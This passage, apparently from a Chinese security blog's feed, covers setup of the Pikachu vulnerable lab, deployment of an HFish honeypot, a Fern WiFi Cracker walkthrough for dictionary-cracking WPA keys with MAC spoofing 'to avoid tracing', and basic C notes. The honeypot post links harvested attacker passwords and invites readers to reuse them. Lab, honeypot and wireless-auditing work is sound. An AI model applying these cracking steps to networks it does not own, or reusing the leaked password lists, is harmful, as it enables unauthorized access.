alt="QQ截图20200510095041.png"><br>如果你点击后发现此类错误,请检查你的设置是否正确,要跟phpstudy的页面一致(大小写也会有影响哦~)<br><img src="https://i.loli.net/2020/05/10/XxGQ4kpdN3SEKgA.png" alt="QQ截图20200510095207.png"><br><img src="https://i.loli.net/2020/05/10/mMXr4hqAuETZsGB.png" alt="QQ截图20200510095649.png"></li><li>修改完成后再点击安装即可<br><img src="https://i.loli.net/2020/05/10/u14fFsU3QerCxB9.png" alt="QQ截图20200510095938.png"><br><img src="https://i.loli.net/2020/05/10/ivF4MlenJjEcyXB.png" alt="QQ截图20200510100019.png">  </li><li>配置pikachu Xss后台,进入这个链接：<a href="http://localhost/pikachu/pkxss/index.php">http://localhost/pikachu/pkxss/index.php</a>   或者直接从管理工具进入后台<br><img src="https://i.loli.net/2020/05/10/3KDm8nsle2gjNCu.png" alt="QQ截图20200510100356.png"><br><img src="https://i.loli.net/2020/05/10/usP2qKAIXzg3kFU.png" alt="QQ截图20200510100526.png"><br>修改完成后点击即可<br><img src="https://i.loli.net/2020/05/10/vhQRkTs3irl8zWt.png" alt="QQ截图20200510100956.png"><br>然后按照底下的用户名和密码登陆即可~<br><img src="https://i.loli.net/2020/05/10/EeTiSFv5Q4Zr89s.png" alt="QQ截图20200510101134.png"><br><img src="https://i.loli.net/2020/05/10/xLy6lCXSe4WcfIr.png" alt="QQ截图20200510101134.png"><br>剩下的功能就大家自己探索啦<del>Pikachu的功能还是很多很好玩的</del><br>Pikachu的靶场每一个漏洞也都有自己的简介,非常的良心~<br><img src="https://i.loli.net/2020/05/10/GeuJVUdHOq21EWi.png" alt="QQ截图20200510101440.png">  <h2 id="至此结束"><a href="#至此结束" class="headerlink" title="至此结束~"></a>至此结束~</h2>我们的Pikachu靶场的基本搭建也已经完成,其实Pikachu本身的注释等写的都非常的清楚,不看这篇文章你照样也可以搭建出来<del>而靶场更多的在于使用，如果后面有时间会出Pikachu靶场的通关全教程</del><br>写作不易，希望各位大佬师傅们能给小弟点钱吃个饭~    </li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 靶场搭建系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 靶场搭建 </tag>
            
            <tag> Pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hfish蜜罐搭建与使用</title>
      <link href="2020/11/08/Hfish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/08/Hfish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Hfish蜜罐搭建与使用"><a href="#Hfish蜜罐搭建与使用" class="headerlink" title="Hfish蜜罐搭建与使用"></a>Hfish蜜罐搭建与使用</h1><h2 id="文章出自JoCat-QQ-1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-67-x61-x74-87-70-89-x40-x31-x36-51-x2e-x63-x6f-109"><a href="#文章出自JoCat-QQ-1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-67-x61-x74-87-70-89-x40-x31-x36-51-x2e-x63-x6f-109" class="headerlink" title="文章出自JoCat QQ:1506610991 有渗透测试需求及商务合作请联系&#x4a;&#x6f;&#67;&#x61;&#x74;&#87;&#70;&#89;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#x6f;&#109;"></a>文章出自JoCat QQ:1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#x6f;&#67;&#x61;&#x74;&#87;&#70;&#89;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#x6f;&#109;">&#x4a;&#x6f;&#67;&#x61;&#x74;&#87;&#70;&#89;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#x6f;&#109;</a></h2><h3 id="本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点"><a href="#本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点"></a>本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点</h3><p>好久不见,各位~<br>我又一周没更Blog了~<br>今天给大家带来的是一款国产最便捷的蜜罐平台——Hfish</p><h2 id="什么是蜜罐"><a href="#什么是蜜罐" class="headerlink" title="什么是蜜罐?"></a>什么是蜜罐?</h2><p>蜜罐通常伪装成看似有利用价值的网络、数据、电脑系统,并故意设置了bug,用来吸引黑客攻击.<br>由于蜜罐事实上并未对网络提供任何有价值的服务,所以任何对蜜罐的尝试都是可疑的.蜜罐中还可能装有监控软件,用以监视黑客入侵后的举动.<br>蜜罐在拖延黑客攻击真正目标上也有一定作用.不过黑客可能发现一个电脑系统是蜜罐,进而提前退出.<br>而更常见的用法是用来吸引网络的计算机病毒入侵,从而获得病毒样本用于研究或破解的计算机,杀毒软件公司会利用这些计算机来监视或获得计算机网络中的病毒样本.<br>而在攻防演练中,蜜罐也是蓝队不可或缺的一种对于攻击者的防御手段     </p><h3 id="简单来说-蜜罐就是一个为了引诱攻击者进行攻击的平台"><a href="#简单来说-蜜罐就是一个为了引诱攻击者进行攻击的平台" class="headerlink" title="简单来说,蜜罐就是一个为了引诱攻击者进行攻击的平台"></a>简单来说,蜜罐就是一个为了引诱攻击者进行攻击的平台</h3><p>而我们的蜜罐也分为很多种类  </p><pre><code>无交互式蜜罐:通常是为了通过释放大量指纹诱导扫描器攻击,针对扫描器的一种蜜罐低交互式蜜罐 :通常是指与操作系统交互程度较低的蜜罐系统,仅开放一些简单的服务或端口,用来检测扫描和连接,这种容易被识别,同时不能捕获一些我们需要的情报和漏洞等.中交互式蜜罐 :介于低交互式和高交互式之间,能够模拟操作系统更多的服务,让攻击者看起来更像一个真实的业务,从而对它发动攻击,这样蜜罐就能获取到更多有价值的信息,如各种Nday或0day,或者是木马等.高交互式 :指的是与操作系统交互很高的蜜罐,它会提供一个更真实的环境,有利于掌握新的攻击手法和类型,但同样也会存在隐患,会对真实网络造成攻击,不过同时它对于攻击者的行为等记录的也会更加清晰,还可以捕获一些样本进行分析.</code></pre><p>这里我推荐几款Github上热度比较高的蜜罐<br>T-pot : <a href="https://github.com/dtag-dev-sec/tpotce">https://github.com/dtag-dev-sec/tpotce</a><br>Honeyd: <a href="https://github.com/DataSoft/Honeyd">https://github.com/DataSoft/Honeyd</a><br>HFISH: <a href="https://github.com/hacklcx/HFish">https://github.com/hacklcx/HFish</a><br>opencanary web : <a href="https://github.com/p1r06u3/opencanary_web">https://github.com/p1r06u3/opencanary_web</a><br>HoneyDrive:<a href="https://sourceforge.net/projects/honeydrive/">https://sourceforge.net/projects/honeydrive/</a><br>RDPy: <a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a><br>Artillery : <a href="https://github.com/trustedsec/artillery/">https://github.com/trustedsec/artillery/</a>  </p><h2 id="蜜罐的一般应用场景"><a href="#蜜罐的一般应用场景" class="headerlink" title="蜜罐的一般应用场景"></a>蜜罐的一般应用场景</h2><p>蜜罐一般有两种应用场景,一种是企业内部为了对于攻击者进行防御而设立的,请注意,蜜罐并没有防御功能,它所能做的是诱捕攻击者进行攻击,拖延时间同时通知管理员进行防御,一般的设立如下图<br><img src="https://i.loli.net/2020/05/31/vHUAeQc82q3LJWx.png" alt="内网蜜罐搭建样例.png"><br>而还有一种则是外网中的设立,如图<br><img src="https://i.loli.net/2020/06/02/g1nzqsGeVk7TM3H.png" alt="外网蜜罐布设.png"><br>而我们把这两种结合起来,就可获得一个较为安全的生产环境,如图<br><img src="https://i.loli.net/2020/05/31/Ssraw5dYolTCRJk.png" alt="较为安全的生产环境.png"></p><h2 id="关于HFish蜜罐的介绍"><a href="#关于HFish蜜罐的介绍" class="headerlink" title="关于HFish蜜罐的介绍"></a>关于HFish蜜罐的介绍</h2><p>项目地址:<a href="https://github.com/hacklcx/HFish/">https://github.com/hacklcx/HFish/</a><br>介绍地址:<a href="https://hfish.io/">https://hfish.io/</a><br><img src="https://i.loli.net/2020/05/31/5QKnPrkO9ABpFgc.png" alt="QQ截图20200531190429.png"><br>HFish 是一款基于 Golang 开发的跨平台蜜罐平台,为了企业安全做出了精心的打造</p><pre><code>多功能: 不仅仅支持 HTTP(S) 蜜罐,还支持 SSH、SFTP、Redis、Mysql、FTP、Telnet、暗网 等扩展性: 提供 API 接口,使用者可以随意扩展蜜罐模块 ( WEB、PC、APP )便捷性: 使用 Golang 开发,使用者可以在 Win + Mac + Linux 上快速部署一套蜜罐平台</code></pre><p>而Hfish支持的蜜罐种类也非常多,图中已经给出<br>Hfish因为是一款低交互式的蜜罐,所以对于服务端的配置要求并不高<br>在官方的宣传页下也有搭建的教程,链接如下:<a href="https://hfish.io/docs/#/">https://hfish.io/docs/#/</a><br>而三斤大佬也有自己的关于这个平台的规划<br><img src="https://i.loli.net/2020/06/02/xzpD1ZYFWtQPXur.png" alt="QQ截图20200602231858.png"><br>所以如果有想给这个平台赞助的,也可以到上文发的项目地址中去捐款~</p><h2 id="Hfish蜜罐搭建"><a href="#Hfish蜜罐搭建" class="headerlink" title="Hfish蜜罐搭建"></a>Hfish蜜罐搭建</h2><p>今天我们会在windows和Linux环境下都进行搭建,组成集群,从而实现态势感知的功能.我们这里会部署一台外网服务器,也会部署一台内网服务器,而我们的服务端则在外网进行.</p><h3 id="注意-服务端必须要能ping通客户端-客户端可不与服务端处在同一个域中"><a href="#注意-服务端必须要能ping通客户端-客户端可不与服务端处在同一个域中" class="headerlink" title="注意,服务端必须要能ping通客户端,客户端可不与服务端处在同一个域中"></a>注意,服务端必须要能ping通客户端,客户端可不与服务端处在同一个域中</h3><p>如果在Linux服务器中搭建,我们则需要安装Screen服务,这个自己百度即可<br>然后我们要新建一个Screen会话,并在会话中启动我们的蜜罐的服务,这样它就会一直执行,不会因为你的SSH登出而关闭了.<br>我们先进行客户端的搭建  </p><ol><li>下载对应压缩包,我们这里使用的是linux系统,使用0.6.2系统<br><img src="https://i.loli.net/2020/05/31/7biLApu5dT4mywW.png" alt="QQ截图20200531191300.png">  </li><li>本地解压并修改 config.ini<br> rpc status 为 2<br> addr 为 服务端的 IP 和 端口<br> name 为 客户端的名字,客户端名字不可重复,名字必须保证唯一性<br> 修改API访问查询密钥,否则容易他人窃取你的钓鱼信息<br> 修改API 上报认证秘钥<br> 修改password为你自己想要的登陆密码<br> 修改account为你想要的登陆用户名   </li><li>利用FTP上传解压后的文件夹</li><li>cd hfish-0.2-linux-amd64   # 名字是解压后压缩包,根据实际情况修改<br> chmod 777 -R db<br> chmod 777 -R Hfish<br> ./HFish run   </li></ol><p>这样即可开启我们的客户端了,接下来我们进行我们外网linux服务端的搭建</p><ol><li>如上,下载对应的压缩包</li><li>本地解压并修改 config.ini<br> rpc status 为 1<br> addr 为 客户端可访问的 IP 和 端口<br> name 为 服务端的名字,默认 server 即可  </li><li>利用FTP上传解压后的文件夹</li><li>cd hfish-0.2-linux-amd64   # 名字是解压后压缩包,根据实际情况修改<br> chmod 777 -R db<br> chmod 777 -R Hfish<br> ./HFish run   </li></ol><p>而在我们内网Windows环境下则更加简单了  </p><ol><li><p>下载对应压缩包,windows环境下解压<br><img src="https://i.loli.net/2020/05/31/ZXuEqTNCP42rMnl.png" alt="QQ截图20200531192547.png"></p></li><li><p>如上本地解压并修改 config.ini<br> rpc status 为 1<br> addr 为 客户端可访问的 IP 和 端口<br> name 为 服务端的名字,默认 server 即可</p></li><li><p>鼠标右键解压压缩包,打开命令终端 (cmd.exe)或poweshell 进入程序根目录<br>cd c:/hfish-0.2-linux-amd64      # 名字是解压后压缩包,根据实际情况修改<br>Win 要给 db 目录 777 权限,具体百度.(有时不需要)<br>./HFish.exe –run  </p></li></ol><p>这样我们即可完成我们的蜜罐集群搭建,而访问我们客户端的9001端口即可登陆进入我们的蜜罐系统<br>例如<a href="https://xxx.xxx.xxx.xxx:9001/">https://xxx.xxx.xxx.xxx:9001</a><br>然后输入你之前设置的登陆用户名和密码即可登陆<br><img src="https://i.loli.net/2020/05/31/lwkjXABbm8MH7ei.png" alt="QQ截图20200531193354.png"><br>而点击上钩列表即可查看上钩的IP等信息<br><img src="https://i.loli.net/2020/05/31/GO9riBdxWgMPvFU.png" alt="QQ截图20200531193503.png"><br>而打开分布式集群即可看到我们的外网服务器和内网服务器的上报情况(这里内网服务没有打开)<br><img src="https://i.loli.net/2020/05/31/kl7LJwa5uoEbMCA.png" alt="QQ截图20200531193632.png"><br>而我们点击系统设置即可对数据进行一些操作还可以配置我们相关服务<br><img src="https://i.loli.net/2020/05/31/c8BotlfuNgyiFYq.png" alt="QQ截图20200531193805.png"><br>在邮件群发页面也可以进行邮件的群发功能,当然要先配置好fmtp服务器与设置<br>而在我们的主页面也可以点击切换大屏来观测我们被攻击的情况,攻击次数越多,颜色越深<br><img src="https://i.loli.net/2020/05/31/F8beAcwkl54EYUr.png" alt="QQ截图20200531194034.png"><br>而我们不仅需要这些信息,更多的是想要捕获的密码等脚本,我们可以利用Hfish自带的API来实现这个功能<br>官方介绍如下:<a href="https://hfish.io/docs/#/help/api">https://hfish.io/docs/#/help/api</a><br>我们也可以使用这个API来统计我们的信息以及收集我们的密码<br>获取密码的方式:http://客户端地址:9001/api/v1/get/passwd_list?key=API访问查询密钥<br>获取全部钓鱼信息:http://客户端地址:9001/api/v1/get/fish_info?key=API访问查询密钥<br>获取黑名单IP(可配合内网防火墙使用):http://服务器地址:9001/api/v1/get/ip?key=API访问查询密钥 </p><h2 id="其他搭建方式"><a href="#其他搭建方式" class="headerlink" title="其他搭建方式"></a>其他搭建方式</h2><p>当然,作为一款国产最便捷的蜜罐平台,Hfish所能提供的搭建方式也不止这一种.<br>我们也可以使用Docker部署,具体操作网址如下:<a href="https://hfish.io/docs/#/deploy/docker">https://hfish.io/docs/#/deploy/docker</a></p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>至此,我们的Hfish蜜罐系统也已经搭建完毕,如果你有需求也可以按照上面的教程去搭建一个集群,而具体的使用方法还是得看各位师傅们的操作.有一个自己的蜜罐系统不仅看起来很酷,对于你内网环境的安全也有很大提升,在这里我分享几张我蜜罐集群收到强烈攻击的截图~<br><img src="https://i.loli.net/2020/05/31/gEpBTMaOvzyqFId.png" alt="_C~G9EPXZL_PC0YDX0S_VLO.png"><br><img src="https://i.loli.net/2020/05/31/g1jTIu9OHVikn8l.png" alt="QQ截图20200531195508.png"><br><img src="https://i.loli.net/2020/05/31/g8ZFhcxd4akS7Mm.png" alt="EDJ_INVH4RS6I__ACEAQ2AM.png"><br>我在这里也分享出来我bwh服务器挂一周所捕获到的密码.不定时会更新的.<br>密码下载地址:<a href="https://jocatw.github.io/password.txt">https://JoCatW.github.io/password.txt</a><br>钓鱼信息下载地址:<a href="https://jocatw.github.io/fishinfo.txt">https://JoCatW.github.io/fishinfo.txt</a><br>而如果想有要利用的师傅,可以自己写个脚本整理下密码即可~</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 蜜罐搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 蜜罐 </tag>
            
            <tag> Hfish </tag>
            
            <tag> 蓝队 </tag>
            
            <tag> 防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fern WIFI Cracker——Kali下一张无线网卡你能做什么?(1)</title>
      <link href="2020/11/08/Fern%20WIFI%20Cracker/"/>
      <url>2020/11/08/Fern%20WIFI%20Cracker/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Fern-WIFI-Cracker——Kali下一张无线网卡你能做什么-1"><a href="#Fern-WIFI-Cracker——Kali下一张无线网卡你能做什么-1" class="headerlink" title="Fern WIFI Cracker——Kali下一张无线网卡你能做什么?(1)"></a>Fern WIFI Cracker——Kali下一张无线网卡你能做什么?(1)</h1><h2 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-67-97-116-87-x46-89-x40-49-x36-51-46-99-x6f-x6d"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-67-97-116-87-x46-89-x40-49-x36-51-46-99-x6f-x6d" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#x6f;&#67;&#97;&#116;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#x6d;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#x6f;&#67;&#97;&#116;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#x6d;">&#x4a;&#x6f;&#67;&#97;&#116;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#x6d;</a></h2><h3 id="本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点"><a href="#本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点"></a>本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点</h3><p>好久不见,各位~<br>我又咕咕咕了一个月…<br>抱歉各位,最近在准备360Hacking Club的议题,所以没时间更新我的Blog了<br>但是今天把最近这一个月重温的一些东西整理出来,开了一个新系列——“Kali下一张无线网卡你能做什么?”<br>本文是这个系列的第一期,这个系列主打介绍一些在kali环境下你可以用一张无线网卡所进行的操作,今天给大家带来的是一款具有GUI界面的傻瓜式wifi破解工具Fern WIFI Cracker  </p><h2 id="一·功能介绍"><a href="#一·功能介绍" class="headerlink" title="一·功能介绍"></a>一·功能介绍</h2><p>我们先来看看KALITOOLS官网的介绍  </p><p>Fern Wifi Cracker Package Description<br>(Fern WIFI Cracker 包说明)   </p><p>Fern Wifi Cracker is a Wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks.   </p><p>Fern Wifi Cracker是使用Python编程语言和Python Qt GUI库编写的无线安全审核和攻击软件程序,该程序能够破解和恢复WEP / WPA / WPS密钥,并且还可以在无线或以太网上运行其他基于网络的攻击 基于网络.</p><p>Fern Wifi Cracker currently supports the following features:<br>(Fern Wifi Cracker当前支持以下功能:)</p><pre><code>1.WEP Cracking with Fragmentation,Chop-Chop, Caffe-Latte, Hirte, ARP Request Replay or WPS  attack     (Fragmentation,Chop-Chop, Caffe-Latte, Hirte攻击,ARP请求重播或WPS攻击)  2.WPA/WPA2 Cracking with Dictionary or WPS based attacks (使用字典或基于WPS的攻击破解WPA / WPA2)  3.Automatic saving of key in database on successful crack(成功破解后自动将密钥保存在数据库中)   4.Automatic Access Point Attack System (自动接入点攻击系统)  5.Session Hijacking (Passive and Ethernet Modes)  (会话劫持(被动模式和以太网模式))6.Access Point MAC Address Geo Location Tracking  (接入点MAC地址地理位置跟踪)7.Internal MITM Engine  (内置MITM引擎)8.Brute force Attacks (HTTP,HTTPS,TELNET,FTP)(暴力破解攻击(HTTP,HTTPS,TELNET,FTP) 9.Update Support  (更新支持)</code></pre><p>Source(源/官网): <a href="https://github.com/savio-code/fern-wifi-cracker">https://github.com/savio-code/fern-wifi-cracker</a>   </p><pre><code>Author(作者): Saviour Emmanuel EkikoLicense(协议许可证): GPLv3</code></pre><h2 id="二·使用方法"><a href="#二·使用方法" class="headerlink" title="二·使用方法"></a>二·使用方法</h2><p>可以看到FernWIFICracker的功能是十分丰富的,而由于它有图形化界面,它的操作也十分便捷    </p><ol><li>我们需要先插上我们的无线网卡,无线网卡的选购我们在这不做具体介绍,后期会出一期Blog专门讲,博客搜索无线网卡即可   </li><li>插上无线网卡后<br><img src="https://i.loli.net/2020/07/04/Bi6YEoyW7vqMezJ.png" alt="QQ截图20200704221154.png"><br>然后在终端中输入iwconfig来查看我们网卡的状态<br><img src="https://i.loli.net/2020/07/04/ZQBgq5bzDrxefTi.png" alt="QQ截图20200704221444.png"><br>这边对于Fren WIFI Cracker来说,不需要更改无线网卡监听模式也是可以进行破解的<br>它会自己帮你进行修改  </li></ol><p>而我们打开它也有两种方法    </p><ol><li>root@kali:~# fern-wifi-cracker<br><img src="https://i.loli.net/2020/07/04/rvsWVMetK6luR1p.png" alt="QQ截图20200704220248.png"></li><li>在应用程序中手动打开<br><img src="https://i.loli.net/2020/07/04/w1m4RkGQNgWlZ2I.png" alt="QQ截图20200704220740.png">  </li></ol><p>而下图是它的功能介绍<br><img src="https://i.loli.net/2020/07/04/RUANZqS5eHkJWT6.png" alt="QQ截图20200704222245.png"><br>我们进行破解先需要选择WIFI网卡,选择之前查看的对应名称的WIFI网卡<br><img src="https://i.loli.net/2020/07/04/wnVvsRZpGT8qAL6.png" alt="QQ截图20200704222805.png"><br>而这边的Tips讲的是<br>Tips - Scan settings<br>To Access the “Settings” for the network scan preferences “Double click”<br>on any area of the main window, “Scan for network button” is used to scan for network based on the settings options of the settings dialog<br>Default is automated scan, Fake Mac-Address is always used<br>(提示-扫描设置<br>要访问网络扫描首选项的“设置”,请单击“双击”<br>在主窗口的任何区域,“扫描网络按钮”用于根据设置对话框的设置选项扫描网络<br>默认为自动扫描,始终使用假Mac地址)  </p><p>我们可以到ToolBox里去修改我们的MAC地址,防止被反追踪<br><img src="https://i.loli.net/2020/07/04/NPnMQqAFk2J8B9o.png" alt="QQ截图20200704223246.png"><br>我们也可以设置我们的字体大小,重启应用即可看到效果<br>接下来我们要扫描AP,如图<br><img src="https://i.loli.net/2020/07/04/tRI7EJmWj6MlCgQ.png" alt="QQ截图20200704223428.png"><br>捕获到33个AP<br>这里我们使用自己的路由器进行测试<br><img src="https://i.loli.net/2020/07/04/MAHbC5fIXo1cQ7u.png" alt="QQ截图20200704223800.png"><br>选择好字典,选择Automate,然后点击Attack即可进行爆破<br><img src="https://i.loli.net/2020/07/04/HNfKwUaz4sLQZIX.png" alt="QQ截图20200704224909.png"><br>如果爆破成功,则如图显示出密码<br><img src="https://i.loli.net/2020/07/04/Aut1JwK7qd2ainp.png" alt="QQ截图20200704225034.png"><br>在KEY Database中也就存贮下了WiFi的密码<br>下一次再点击这个wifi它就会直接显示出wifi密码<br>至此我们的破解也就完成了   </p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>Fern WIFI Cracker作为使用Python编程语言和Python Qt GUI库编写的无线安全审计和攻击软件程序来说,对于小白是十分友好的,不需要过多的指令来进行破解,图形化界面提供了极大的方便,对于我们渗透过程中也是十分方便的<br>而拿到WIFIKey后的事情,我也会出教程来教学,敬请期待吧~<br>喜欢本文的师傅们可以打赏支持,如有错误请联系我,欢迎各位师傅指点~</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 无线安全 </tag>
            
            <tag> 无线网卡 </tag>
            
            <tag> Fern WIFI Cracker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C字符与字符串</title>
      <link href="2020/11/08/C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E5%AD%97%E7%AC%A6/"/>
      <url>2020/11/08/C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E5%AD%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a>字符与字符串</h2><p>signed和unsigned<br>signed表示有正负性(范围对半取)<br>unsigned表示无正负性（不能出现负数）（无正负性的占位符由%d改为%u）  </p><h3 id="BTW"><a href="#BTW" class="headerlink" title="BTW."></a>BTW.</h3><p>{printf中的占位符有如下规则<br>%d把对应的整数按有符号十进制输出，%u把对应的整数按无符号十进制输出，<br>比如printf(“%d,%u\n”,-123,-123);，输出则是-123,4294967173<br>因为-123的补码是11111111111111111111111110000101，在%u控制下把它当正数输出了。<br>占位符介绍：<br>%d 有符号10进制整数<br>%i 有符号10进制整数<br>%o 无符号8进制整数<br>%u 无符号10进制整数<br>%x 无符号的16进制数字，并以小写abcdef表示<br>%X 无符号的16进制数字，并以大写ABCDEF表示<br>%F/f 浮点数<br>%E/e 用科学表示格式的浮点数<br>%g 使用%f和%e表示中的总的位数表示最短的来表示浮点数 G 同g格式，但表示为指数<br>%c 单个字符<br>%s 字符串<br>}   </p><p>通常情况下，int未书写unsigned默认都使用signed<br>而char类型并没有规定（根据用户编译器自行规定），所以书写时注意取值范围<br>signed char （-128<del>127）<br>unsigned char (0</del>255)<br>char类型为1byte<br>用法跟其他基本数据类型一样  </p><h3 id="字符串的使用"><a href="#字符串的使用" class="headerlink" title="字符串的使用"></a>字符串的使用</h3><p>c语言字符串常量用双引号括起来。<br>单引号括起的是 字符。<br>结构： char 变量名 [数量]；<br>可以使用如下结构获得字符变量的空间： 变量名[索引号]=字符；   </p><p>e.g.  </p><p>char name[7];//从零开始计数<br>name[0]=’J’;<br>name[1]=’o’;<br>name[2]=’C’;<br>name[4]=’a’;<br>name[5]=’t’;//注意括号是单引号<br>name[6]=’\0’//注意\0表示字符串的结束<br>如果没有\0，系统则会一读取下去，出现乱码  </p><p>或    </p><p>char name [7]={‘J’,’o’,’C’,’a’,’t’,’\0’};//注意\0<br>printf(“%s\n”,name);//注意%s   </p><p>编译器在char name [number]结构中有时并不需要你去计算number，<br>也就是字符串的长度（一般的字符串的长度=你要输入的字符长度+\0的一格=想输入数字+1)<br>可以简写为char name[]//number编译器会自动帮你计算  </p><p>字符串也可以在char name [number]={}的大括号中直接写入字符串常量<br>e.g.char name []={“JoCat”}；//[]可以留空，用“双引号”括起来，结尾不需加\0来终止<br>甚至你可以这样：char name []=”JoCat”大括号也可以省略哦~             </p><p>在C语言中，字符实质上是ASCll码<br>ASCII码值大小比较:数字的ASCII码 &lt; 大写字母的ASCII码 &lt; 小写字母的ASCII码。   </p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言数据类型</title>
      <link href="2020/11/08/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>2020/11/08/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://i.loli.net/2020/04/25/UMcg7DBwv8zfdka.png" alt="C数据类型.png"></p><h2 id="上面是数据类型的总结"><a href="#上面是数据类型的总结" class="headerlink" title="上面是数据类型的总结"></a>上面是数据类型的总结</h2><h3 id="sizeof-运算符（长度运算符）可以获取数据类型或表达式的长度"><a href="#sizeof-运算符（长度运算符）可以获取数据类型或表达式的长度" class="headerlink" title="sizeof 运算符（长度运算符）可以获取数据类型或表达式的长度"></a>sizeof 运算符（长度运算符）可以获取数据类型或表达式的长度</h3><p>—sizeof(object)<br>—sizeof(type_name)<br>—sizeof object<br>e.g.  </p><p>#include &lt;stdio.h&gt;   </p><p>int main(viod){<br>    int k;<br>    k=1<br>    printf(“size of int is %d\n”,sizeof ((int)));//数据类型必须加括号<br>    printf(“%d”,sizeof (k));//表达式则不一定需要加括号<br> //注意这里输出的单位都是字节<br>return 0;  </p><p>}  </p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言关系运算符与逻辑运算符</title>
      <link href="2020/11/08/C%E8%AF%AD%E8%A8%80%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>2020/11/08/C%E8%AF%AD%E8%A8%80%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
